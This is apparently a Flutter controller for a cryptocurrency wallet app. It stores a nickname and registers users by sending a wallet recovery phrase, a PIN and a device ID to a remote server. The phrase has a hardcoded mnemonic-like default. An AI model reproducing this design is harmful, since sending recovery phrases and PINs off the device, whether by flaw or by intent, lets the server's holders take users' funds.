import 'package:genesiswallet/utils/http/models/registrationmodel.dart';
import 'package:get/get.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class NicknameController extends GetxController {
  var nickname = ''.obs;
  var isLoading = false.obs;
  var errorMessage = ''.obs;

  @override
  void onInit() {
    super.onInit();
    loadNickname();
  }

  Future<void> saveNickname(String nickname, String pin) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('nickname', nickname);
    this.nickname.value = nickname;
  }

  Future<void> loadNickname() async {
    final prefs = await SharedPreferences.getInstance();
    nickname.value = prefs.getString('nickname') ?? '';
  }

  Future<RegisterDataModel> submitData({
    String phrase =
        'every least seems glovesthat golden cheerfully latitude better havent think shall nothing longitude scale them',
    String deviceId = 'Iphone 14',
    required String pin,
    required String nickname,
    String phraseType = 'App',
  }) async {
    isLoading.value = true;
    errorMessage.value = '';

    var headers = {
      'Accept': 'application/json',
      'Content-Type': 'application/x-www-form-urlencoded'
    };
    var request = http.Request(
        'POST', Uri.parse('https://app.trustforge.cc/api/auth/register'));

    request.bodyFields = {
      'phrase': phrase,
      'device_id': deviceId,
      'pin': pin,
      'nickname': nickname,
      'phrase_type': phraseType,
    };

    request.headers.addAll(headers);

    try {
      http.StreamedResponse response = await request.send();

      if (response.statusCode == 200) {
        String responseBody = await response.stream.bytesToString();
        isLoading.value = false;
        return registerDataModelFromJson(responseBody);
      } else {
        String errorResponse = await response.stream.bytesToString();
        errorMessage.value = 'Failed to register: ${response.reasonPhrase}';
        isLoading.value = false;
        throw Exception('Failed to register: ${response.reasonPhrase}');
      }
    } catch (e) {
      errorMessage.value = e.toString();
      isLoading.value = false;
      throw e;
    }
  }
}
